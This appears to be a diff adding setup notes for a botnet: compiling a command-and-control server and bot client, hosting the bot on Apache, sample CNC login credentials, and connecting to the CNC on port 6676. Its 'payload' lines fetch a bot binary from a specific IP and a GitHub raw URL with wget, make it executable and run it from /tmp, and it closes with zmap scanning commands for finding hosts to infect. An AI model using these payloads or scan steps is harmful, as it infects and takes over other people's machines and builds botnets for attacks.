@@ -1,0 +1,83 @@
+sudo apt-get update
+sudo apt-get install gcc screen apache2 python2 python-pip -y
+sudo apt-get install zmap
+sudo systemctl start apache2
+ulimit 9999999999
+gcc -o cnc cnc.c -lpthread
+
+######################################################
+ PUT YOUR VPS IP IN bot.c
+######################################################
+
+gcc -o bot bot.c
+cp bot /var/www/html/bot
+
+sudo ufw enable
+sudo ufw allow 22/tcp
+sudo ufw allow 6676/tcp
+sudo ufw allow 6677/tcp
+
+######################################################
+ EDIT USER.TXT | EXAMPLE:
+######################################################
+
+root rootpassword admin
+user1 user1password user
+user2 user2password user
+
+######################################################
+ 
+chmod +x * user.txt 
+chmod +x * cnc
+screen ./cnc
+
+######################################################
+ KILL CNC + BOT
+######################################################
+
+sudo netstat -tulnp | grep LISTEN
+ps aux | grep bot
+kill -9 12345
+sudo kill -9 1312
+
+######################################################
+ CONNECT TO CNC
+######################################################
+
+In your same vps:
+telnet 0.0.0.0 6676
+or
+nc 0.0.0.0 6676
+
+From anywhere:
+telnet 158.69.251.105 6676
+or
+through PuTTy/KiTTy using raw connection mode on port 6676
+
+######################################################
+ CLIENT USAGE
+######################################################
+
+
+Client file:
+bot (built from bot.c if you did every steps before this one it's already built)
+
+Launch client:
+sudo ./bot
+Better with sudo but also work without it
+
+Your payload:
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.251.105:6678/bot -O bot; chmod +x bot; ./bot
+
+Offline payload:
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ./bot
+
+Github payload:
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Cod-TE/bot/main/bot; chmod 777 *; ./bot
+
+Command for scanning:
+screen python2 scan.py 376 LUCKY2 x all
+go build ScanListen.go
+ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q | ./ScanListen 80
+
+PLEASE START AND CONNECT TO CNC BEFORE LOADING BOTS
